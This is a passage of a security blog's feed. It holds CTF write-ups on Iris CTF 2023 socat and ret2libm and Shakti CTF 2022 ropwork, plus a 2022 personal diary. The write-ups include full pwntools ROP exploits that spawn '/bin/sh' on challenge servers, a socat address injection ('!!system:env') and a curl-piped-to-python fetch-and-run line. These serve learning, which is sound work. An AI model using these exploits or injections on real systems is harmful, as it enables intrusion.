class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(setenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NO!&quot;</span>, <span class="number">1</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    execvp(argv[<span class="number">1</span>], argv+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The source code of chal binary is just sets the <code>FLAG</code> env empty.</p><h2 id="Vulnerability-amp-Solve-1-intended"><a href="#Vulnerability-amp-Solve-1-intended" class="headerlink" title="Vulnerability &amp; Solve 1 (intended)"></a>Vulnerability &amp; Solve 1 (intended)</h2><p>It would be good to refer to the public writeup for this part. For reference, the change log in the public writeup can be found at the <a href="https://pkgsrc.se/net/socat">pkgsrc.se&#x2F;net&#x2F;socat</a>.</p><ul><li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md</a></li></ul><p>Finally, The <code>setenv(&quot;FLAG&quot;, &quot;NO!&quot;, 1)</code> is to help prevent any unintended solutions. It retains environment variable only during execution. It would be like I can print env with <code>ls</code>, but I can’t. I concentrated this part but it was a waste of time. I haven’t been able to solve this challenge.</p><h2 id="Solve-2-unintended"><a href="#Solve-2-unintended" class="headerlink" title="Solve 2 (unintended)"></a>Solve 2 (unintended)</h2><p>Looking at the Discord, there were many people who solved the challenge in this way. (I think it would be okay to use this solution for later. whenever..)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">socat -d -d - TCP4:www.example.com:80</span><br></pre></td></tr></table></figure><p>As for the solution, here it is: <code>!!system:env</code></p><p>The <code>system</code> is type of socat address. If you use <code>!!</code>, two single addresses specifications can be combined to form a dual type address for one bytestream.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM:&lt;shell-command&gt;</span><br><span class="line">Forks a sub process that establishes communication with its parent process and invokes the specified program with system() . Please note that &lt;shell-command&gt; [string] must not contain &#x27;,&#x27; or &quot;!!&quot;, and that shell meta characters may have to be protected. After successful program start, socat writes data to stdin of the process and reads from its stdout.</span><br></pre></td></tr></table></figure><p>You can find another type of socat address.:</p><ul><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_TYPES">www.dest-unreach.org/socat/doc/socat.html</a></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://copyconstruct.medium.com/socat-29453e9fc8a6">https://copyconstruct.medium.com/socat-29453e9fc8a6</a></li><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_SPECIFICATIONS">http://www.dest-unreach.org/socat/doc/socat.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - ret2libm (simple BOF)</title>
      <link href="/230109-irisctf2023-ret2libm/"/>
      <url>/230109-irisctf2023-ret2libm/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>49 Solves (4.7% of users)<br>392 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I need to make a pwn? Let’s go with that standard warmup rop thing… what was it… ret2libm?<br><code>nc ret2libm.chal.irisc.tf 10001</code></p><p>Hint!<br>The challenge server may be acting up. If your solution works locally and on the docker but not on remote, please open a ticket!</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal</span><br><span class="line">├── chal.c</span><br><span class="line">├── libc-2.27.so</span><br><span class="line">├── libm-2.27.so</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c6fac9007a0e13f2ca1978d85d974afb7fd03d9, not stripped</span><br></pre></td></tr></table></figure><p>This challenge use a <code>libc-2.27.so</code> So enviroment seems to Ubuntu 18.04 that different to me. That enviroment is different from mine, I downloaded <code>ld</code> file with docker. And then I patched it. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch ret2libm]$ ldd chal</span><br><span class="line">linux-vdso.so.1 (0x00007fff13dc7000)</span><br><span class="line">./libm-2.27.so (0x00007fbe43800000)</span><br><span class="line">./libc-2.27.so (0x00007fbe43400000)</span><br><span class="line">./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbe43e9a000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -fno-stack-protector -lm</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> yours[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Check out my pecs: %p\n&quot;</span>, <span class="built_in">fabs</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How about yours? &quot;</span>);</span><br><span class="line">    gets(yours);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see how they stack up.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The challenge leaks the pointer to a <code>fabs</code> in libm.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The <code>gets()</code> functions cause to <code>Buffer overflow</code>. We can change the <code>RIP</code>.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Just do it!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;, env = &#123;</span></span><br><span class="line">    <span class="comment"># &#x27;LD_PRELOAD&#x27; : &#x27;./libm-2.27.so&#x27;</span></span><br><span class="line">    <span class="comment"># &#125;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2libm.chal.irisc.tf&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libm = ELF(<span class="string">&#x27;./libm-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;pecs:&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libm_base = leak - libm.sym[<span class="string">&#x27;fabsf64&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libm_base))</span><br><span class="line"></span><br><span class="line">libc.address = libm_base - <span class="number">0x3f1000</span> </span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x02164f) # pop rdi</span></span><br><span class="line"><span class="comment"># payload += p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span></span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x8aa) # ret</span></span><br><span class="line"><span class="comment"># payload += p64(libc.sym[&#x27;system&#x27;])`</span></span><br><span class="line"></span><br><span class="line">payload += p64(libm_base + <span class="number">0xbc37</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libm_base + <span class="number">0x2a2</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;yours?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><p>And In this challenge, We can use onegadget. :-)</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;oh_its_ret2libc_anyway&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022-12-31 Diary (2022 Memoir)</title>
      <link href="/221231-diary/"/>
      <url>/221231-diary/</url>
      
        <content type="html"><![CDATA[<p>Today is 2022’s last day. So, I’m writing a 2022 Memoir. :-D</p><h2 id="Graduated-University"><a href="#Graduated-University" class="headerlink" title="Graduated University"></a>Graduated University</h2><p>After completing BoB in the first half of the year, I returned to University. At the same time, I joined the company, so I didn’t go to University, but I devoted time to graduation assignments. I tended to go to University diligently during the past period. I always did my best to do my assignments or not be absent… etc. Going to University while working at the same time was harder than I thought. The hardest thing was to do graduation assignments. Still, thanks to the team members, I was able to finish my graduation assignments well and received the highest grade of A+. I’m very satisfied.</p><p>The content of graduation assignment is as follows. We proposed a market and developed a system to trade ultra-light food for single students or dormitory students attending our University. My role in the project was DB development and backend development. We use the Node JS for development.</p><p>I was able to successfully achieve my graduation in August by successfully obtaining the license(정보처리기사) for graduation within the deadline. I’m so glad. In fact, around the time I graduated, I formed a team as a University student and participated in the offline CTF. I placed on 6th in 2022 Hektheon Sejong 1st CTF. My role was Pwnable. I also worked hard to solve the problem, but in the end, I think I won the award thanks to other people.</p><h2 id="Joining-and-Leaving-the-company"><a href="#Joining-and-Leaving-the-company" class="headerlink" title="Joining and Leaving the company"></a>Joining and Leaving the company</h2><p>I joined an offensive research company in March of this year, a month before completing BoB. It was my first social life outside of University and BoB. I originally intended to organize my life in Seoul after completing BoB and go to the school dormitory to rest. However, the company gave me a good opportunity of assignments and interviews, so I worked hard and passed and joined the company. So, I remember canceling my University dormitory in a hurry. I thought attending a company was a much better opportunity for me than going back to University. I joined the company with such a hopeful mindset, but resigned in September.</p><p>There are many reasons for leaving the company, but one of them is to travel in search of a dream.(?) I felt cramped while going to the company, and even though I only went to the company for a short period of time, I didn’t think it was helpful. It has been about 3 months since I left. I am so happy now. I don’t think in a hurry and have time to spare, so I’m working on the computer with a more enjoyable mind than before. I really like myself for having this mindset.</p><h2 id="Demon-Team"><a href="#Demon-Team" class="headerlink" title="Demon Team"></a>Demon Team</h2><p>Demon team did a lot of things this year. Next year, I want to do a lot of useful and fresh things.</p><ol><li>Although the team name was not listed in the article, We participated in the CDDC 2022 program. My role in the program was prepared for basic English lectures on overall security. I remember preparing for about two months from April.</li></ol><ul><li>related article: <a href="https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl">https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl</a></li></ul><ol start="2"><li><p>I was prepared Chungbuk Hacking Camp system hacking lecture and Pwnable field of CTF. The CDDC above was an online lecture, but this Chungbuk Hacking Camp lecture was an offline. I remember being very nervous because it was my first offline presentation. It was disappointing that out of 20 high school students, there were only 1 or 2 students who focused more on Pwnable than expected. However, I felt fortunate that I prepared a really basic lecture. I remember that this was in July.</p></li><li><p>I gave a presentation of Summer Hacking camp. And I wrote a Pwanble challenge for the CTF held in there. The presentation was prepared with a senior from the previous company. I don’t remember exactly when, but I remember it was after the Hacking camp in Chungbuk. The topic of the presentation is my history of system hacking up to this point. I thought it was enough to share the experience because I completed BoB shortly after I started studying and joined the company right away. However, now I am confident that I have grown much more skillfully than I did back then. If there are good results in my personal research, I would like to make a presentation at Hacking Camp with technical content next time.</p></li><li><p>I wrote a Pwnable challenge for the Women’s Hacking Contest Power Of XX. There were two challenges each in the preliminaries and finals. In the finals, I wrote a one more challenge for Misk. This is November, and it is the time when I left the company. That’s why I had relatively more time, so I did a lot of research on the challenge, and I’m attached to it. Information on the challenge is attached below.</p></li></ol><ul><li><a href="https://jiravvit.github.io/221121-poxx2022-shop_revenge/">https://jiravvit.github.io/221121-poxx2022-shop_revenge/</a></li></ul><h2 id="New-beginnings-with-MacBook-Air-M2"><a href="#New-beginnings-with-MacBook-Air-M2" class="headerlink" title="New beginnings (with MacBook Air M2)"></a>New beginnings (with MacBook Air M2)</h2><p>After leaving the scompany, everything changed. I always hacked with an anxious and urgent mindset, but now I have a time to spare. It’s a fun and happy feeling. I received a MacBook as a gift this time, and I feel happier because I use it. Speaking of Mac, I have been using Windows, Linux, and Mac OS this year. I’ve been using Linux for about 3 months and Mac for about a month, but I like Mac the most. It is the prettiest and most sophisticated feeling.</p><p>Anyway, I’m happy to be able to greet 2023 with a new MacBook. I feel like I can live happily ever after. I will have to use my MacBook for the rest of my life! ;)</p><br><img src="/images/221231-diary/221231-mac.png" width="450"/>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - ropwork (hard)</title>
      <link href="/221222-shaktictf2022-ropwork/"/>
      <url>/221222-shaktictf2022-ropwork/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!</p><p>Note:<br>The server is running on Ubuntu 20.04<br>The flag file found on the server is given a random name.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropework_460328c6-afec-4492-9b9f-97a1f35c71af: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=8186a401dd45223b37552a01bd54666547a11437, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\n&#x27;&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">329</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Ok bye!\n&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>대놓고 bof 터진다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>fgets</code> 함수에서 변수 사이즈보다 더 큰 값을 쓸 수 있어서 bof가 터진다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>bss + 0x20 에다가 &#x2F;bin&#x2F;sh 써주고 system 함수 인자로 이걸 줘서 실행시켰다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">31825</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">xor_rax = <span class="number">0x401182</span></span><br><span class="line">pop_rdi = <span class="number">0x401273</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401271</span></span><br><span class="line">xor_rdx_rbx = <span class="number">0x040118e</span></span><br><span class="line">syscall = <span class="number">0x4011a2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(e.bss()+<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(xor_rdx_rbx)</span><br><span class="line">payload += p64(xor_rax) <span class="comment"># sys_read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+ <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(e.bss()+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>처음에 csu 가젯으로 문제를 풀려고 했었는데 뭔가 잘 안되어서 다른 방법 생각해보다가 문제를 풀었다. 역시.. 롸업은 문제 풀고 바로바로 작성해야 생생하게 적을 수 있는 것 같다.. (다시 풀긴.. 좀..) 이제 롸업 안미루고 잘 적을 것이다..</p><p>아 그리고 이 씨텝에서 롸업으로 적은 세 문제 말고 easy 2문제와 meduim 한 문제가 있었다. easy는 너무 쉬워서 롸업 업로드를 안하려고 한다. (솔브가 거의 60~70이다.) medium은 못풀었는데 연결리스트 구현 관련된 문제이다. 연결리스트가 뭔지 까먹어서.. ctf 기간 때 연결리스트 공부했던 기억이 난다.<br>아무튼 이 씨텝에서 포너블이 총 6개였는데 한 문제 빼고 다 풀어서 기분이 굉장히 좋았다. 남은 연결리스트 관련 문제는 결국 롸업을 봤는데 heap에서 unsafe-unlink라는 기법을 사용하여 익스를 하는 문제이다. 개인적으로 heap 관련 문제는 내가 heap을 공부를 제대로 안했기 때문에 풀지 않는다.(?????) 평생 안할 계획은 아니고 내년으로 미뤄둬야지.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - phrack_crack (hard)</title>
      <link href="/221222-shaktictf2022-phrack_crack/"/>
      <url>/221222-shaktictf2022-phrack_crack/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>phrack_phrack_phrack_crack_crack_crack.<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── ld.so.2</span><br><span class="line">├── libc.so.6</span><br><span class="line">└── phrack_crack</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phrack_crack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=06dd3b9850dc326bd98cb17e0049bcec4bd15219, not stripped</span><br></pre></td></tr></table></figure><p>ld와 libc가 주어졌으니 patchelf를 